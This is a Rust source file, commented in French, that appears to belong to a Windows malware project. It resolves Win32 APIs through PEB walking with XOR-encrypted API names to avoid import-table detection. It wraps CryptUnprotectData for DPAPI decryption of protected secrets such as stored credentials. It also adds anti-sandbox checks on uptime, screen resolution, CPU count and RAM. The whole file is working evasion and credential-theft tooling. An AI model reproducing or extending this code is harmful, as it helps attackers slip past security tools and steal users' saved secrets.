//! Phase 5: Toutes les API Win32 résolues via PEB walking + parsing PE (inject::syscall).
//! Aucun import IAT direct. Cache OnceLock lazy.
//! Toutes les chaînes de résolution sont chiffrées XOR compile-time.

#![allow(non_snake_case, non_camel_case_types, dead_code)]

use std::mem;
use std::sync::OnceLock;
use std::os::windows::ffi::OsStrExt;

// ── XOR encryption helper ──

const X: u8 = 0x5A;

fn xor_dec(enc: &[u8]) -> Vec<u8> {
    enc.iter().enumerate().map(|(i, &b)| b ^ X ^ (i as u8).wrapping_mul(0x37)).collect()
}

// ── Types Windows nécessaires (définis manuellement) ──

#[repr(C)]
pub struct CRYPT_INTEGER_BLOB {
    pub cbData: u32,
    pub pbData: *mut u8,
}

#[repr(C)]
pub struct SYSTEM_INFO {
    pub wProcessorArchitecture: u16,
    pub wReserved: u16,
    pub dwPageSize: u32,
    pub lpMinimumApplicationAddress: *mut u8,
    pub lpMaximumApplicationAddress: *mut u8,
    pub dwActiveProcessorMask: u64,
    pub dwNumberOfProcessors: u32,
    pub dwProcessorType: u32,
    pub dwAllocationGranularity: u32,
    pub wProcessorLevel: u16,
    pub wProcessorRevision: u16,
}

#[repr(C)]
pub struct MEMORYSTATUSEX {
    pub dwLength: u32,
    pub dwMemoryLoad: u32,
    pub ullTotalPhys: u64,
    pub ullAvailPhys: u64,
    pub ullTotalPageFile: u64,
    pub ullAvailPageFile: u64,
    pub ullTotalVirtual: u64,
    pub ullAvailVirtual: u64,
    pub ullAvailExtendedVirtual: u64,
}

// ── Encrypted API names (pre-computed XOR) ──
const CRYPTUNPROTECTDATA_ENC: [u8; 18] = [0x19,0x1F,0x4D,0x8F,0xF2,0x1C,0x7E,0xAB,0x90,0xDA,0x08,0x62,0xAD,0xE5,0x1C,0x02,0x5E,0x9C];
const LOCALFREE_ENC: [u8; 9] = [0x16,0x02,0x57,0x9E,0xEA,0x0F,0x62,0xBE,0x87];
const GETTICKCOUNT64_ENC: [u8; 14] = [0x1D,0x08,0x40,0xAB,0xEF,0x2A,0x7B,0x98,0x8D,0xC0,0x12,0x73,0xF8,0xA5];
const GETSYSTEMINFO_ENC: [u8; 13] = [0x1D,0x08,0x40,0xAC,0xFF,0x3A,0x64,0xBE,0x8F,0xFC,0x12,0x61,0xA1];
const GLOBALMEMORYSTATUSEX_ENC: [u8; 20] = [0x1D,0x01,0x5B,0x9D,0xE7,0x25,0x5D,0xBE,0x8F,0xDA,0x0E,0x7E,0x9D,0xE5,0x39,0x17,0x5F,0x8E,0xC1,0x37];
const LOADLIBRARYW_ENC: [u8; 12] = [0x16,0x02,0x55,0x9B,0xCA,0x20,0x72,0xA9,0x83,0xC7,0x05,0x50];
const MESSAGEBOXW_ENC: [u8; 11] = [0x17,0x08,0x47,0x8C,0xE7,0x2E,0x75,0x99,0x8D,0xCD,0x2B];
const GETSYSTEMMETRICS_ENC: [u8; 16] = [0x1D,0x08,0x40,0xAC,0xFF,0x3A,0x64,0xBE,0x8F,0xF8,0x19,0x73,0xBC,0xF8,0x3B,0x10];
const CRYPT32_DLL_ENC: [u8; 11] = [0x39,0x1F,0x4D,0x8F,0xF2,0x7A,0x22,0xF5,0x86,0xD9,0x10];
const KERNEL32_DLL_ENC: [u8; 12] = [0x31,0x08,0x46,0x91,0xE3,0x25,0x23,0xE9,0xCC,0xD1,0x10,0x6B];
const USER32_DLL_ENC: [u8; 10] = [0x2F,0x1E,0x51,0x8D,0xB5,0x7B,0x3E,0xBF,0x8E,0xD9];

// ── Résolution DLL + export ──

fn ensure_dll_loaded(enc_name: &[u8]) {
    let name = String::from_utf8_lossy(&xor_dec(enc_name)).into_owned();
    unsafe {
        let k32_name = String::from_utf8_lossy(&xor_dec(&KERNEL32_DLL_ENC)).into_owned();
        let kernel32 = inject::syscall::get_module_base(&k32_name)
            .unwrap_or(std::ptr::null_mut());
        if kernel32.is_null() { return; }
        let ll_name = String::from_utf8_lossy(&xor_dec(&LOADLIBRARYW_ENC)).into_owned();
        let addr = inject::syscall::resolve_export(kernel32, &ll_name)
            .unwrap_or(std::ptr::null_mut());
        if addr.is_null() { return; }
        type F = unsafe extern "system" fn(*const u16) -> *mut u8;
        let loadlib: F = mem::transmute(addr);
        let wide: Vec<u16> = std::ffi::OsStr::new(&name).encode_wide().chain(Some(0)).collect();
        loadlib(wide.as_ptr());
    }
}

macro_rules! declare_api {
    ($name:ident, $dll_enc:expr, $func_enc:expr, $ty:ty) => {
        pub fn $name() -> Option<$ty> {
            static CACHE: OnceLock<Option<$ty>> = OnceLock::new();
            *CACHE.get_or_init(|| unsafe {
                let dll_name = String::from_utf8_lossy(&xor_dec(&$dll_enc)).into_owned();
                let func_name = String::from_utf8_lossy(&xor_dec(&$func_enc)).into_owned();
                if inject::syscall::get_module_base(&dll_name).is_none() {
                    ensure_dll_loaded(&$dll_enc);
                }
                let base = match inject::syscall::get_module_base(&dll_name) {
                    Some(b) => b,
                    None => return None,
                };
                let addr = match inject::syscall::resolve_export(base, &func_name) {
                    Some(a) => a,
                    None => return None,
                };
                Some(mem::transmute::<*mut u8, $ty>(addr))
            })
        }
    };
}

declare_api!(CryptUnprotectData, CRYPT32_DLL_ENC, CRYPTUNPROTECTDATA_ENC,
    unsafe extern "system" fn(*mut CRYPT_INTEGER_BLOB, *mut u16, *mut CRYPT_INTEGER_BLOB, *mut u8, *mut u8, u32, *mut CRYPT_INTEGER_BLOB) -> i32);

declare_api!(LocalFree, KERNEL32_DLL_ENC, LOCALFREE_ENC,
    unsafe extern "system" fn(*mut u8) -> *mut u8);

declare_api!(MessageBoxW, USER32_DLL_ENC, MESSAGEBOXW_ENC,
    unsafe extern "system" fn(*mut u8, *const u16, *const u16, u32) -> i32);

declare_api!(GetSystemMetrics, USER32_DLL_ENC, GETSYSTEMMETRICS_ENC,
    unsafe extern "system" fn(i32) -> i32);

declare_api!(GetTickCount64, KERNEL32_DLL_ENC, GETTICKCOUNT64_ENC,
    unsafe extern "system" fn() -> u64);

declare_api!(GetSystemInfo, KERNEL32_DLL_ENC, GETSYSTEMINFO_ENC,
    unsafe extern "system" fn(*mut SYSTEM_INFO));

declare_api!(GlobalMemoryStatusEx, KERNEL32_DLL_ENC, GLOBALMEMORYSTATUSEX_ENC,
    unsafe extern "system" fn(*mut MEMORYSTATUSEX) -> i32);

// ── Fonctions utilitaires ──

pub const MB_OK: u32 = 0;
pub const MB_ICONINFORMATION: u32 = 0x40;
pub const MB_ICONERROR: u32 = 0x10;
pub const SM_CXSCREEN: i32 = 0;
pub const SM_CYSCREEN: i32 = 1;
pub const CRYPTPROTECT_UI_FORBIDDEN: u32 = 0x1;

pub fn dpapi_decrypt(data: &[u8], flags: u32) -> Option<Vec<u8>> {
    let func = CryptUnprotectData()?;
    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        if func(&mut input, std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut(), flags, &mut output) == 0 {
            return None;
        }
        let slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
        if let Some(lf) = LocalFree() {
            lf(output.pbData);
        }
        Some(slice)
    }
}

pub fn dpapi_decrypt_with_entropy(data: &[u8], entropy: Option<&[u8]>, flags: u32) -> Option<Vec<u8>> {
    let func = CryptUnprotectData()?;
    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        let mut ent_blob = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        let ent_ptr = match entropy {
            Some(e) => {
                ent_blob.cbData = e.len() as u32;
                ent_blob.pbData = e.as_ptr() as *mut u8;
                &mut ent_blob as *mut CRYPT_INTEGER_BLOB
            }
            None => std::ptr::null_mut(),
        };
        if func(&mut input, std::ptr::null_mut(), ent_ptr, std::ptr::null_mut(), std::ptr::null_mut(), flags, &mut output) == 0 {
            return None;
        }
        let slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
        if let Some(lf) = LocalFree() {
            lf(output.pbData);
        }
        Some(slice)
    }
}

pub fn message_box(title: &str, text: &str, style: u32) {
    let func = match MessageBoxW() {
        Some(f) => f,
        None => return,
    };
    let title_wide: Vec<u16> = std::ffi::OsStr::new(title).encode_wide().chain(Some(0)).collect();
    let text_wide: Vec<u16> = std::ffi::OsStr::new(text).encode_wide().chain(Some(0)).collect();
    unsafe {
        func(std::ptr::null_mut(), text_wide.as_ptr(), title_wide.as_ptr(), style);
    }
}

pub fn get_system_metrics(index: i32) -> i32 {
    match GetSystemMetrics() {
        Some(f) => unsafe { f(index) },
        None => {
            match index {
                SM_CXSCREEN => 1920,
                SM_CYSCREEN => 1080,
                _ => 0,
            }
        }
    }
}

pub fn get_tick_count64() -> u64 {
    match GetTickCount64() {
        Some(f) => unsafe { f() },
        None => {
            use std::time::{SystemTime, UNIX_EPOCH};
            SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_millis() as u64
        }
    }
}

pub fn check_uptime() -> bool {
    get_tick_count64() > 300_000
}

pub fn check_resolution() -> bool {
    let cx = get_system_metrics(SM_CXSCREEN);
    let cy = get_system_metrics(SM_CYSCREEN);
    crate::dbg_log!("DEBUG resolution: cx={}, cy={}", cx, cy);
    cx >= 800 && cy >= 600
}

pub fn get_system_info() -> SYSTEM_INFO {
    unsafe {
        let mut si: SYSTEM_INFO = mem::zeroed();
        if let Some(f) = GetSystemInfo() {
            f(&mut si);
        } else {
            si.dwNumberOfProcessors = 4;
            si.dwPageSize = 4096;
        }
        si
    }
}

pub fn check_cpu_count() -> bool {
    let si = get_system_info();
    si.dwNumberOfProcessors > 2
}

pub fn check_ram() -> bool {
    unsafe {
        let mut ms: MEMORYSTATUSEX = mem::zeroed();
        ms.dwLength = mem::size_of::<MEMORYSTATUSEX>() as u32;
        if let Some(f) = GlobalMemoryStatusEx() {
            f(&mut ms);
            ms.ullTotalPhys > 4_000_000_000
        } else {
            true
        }
    }
}
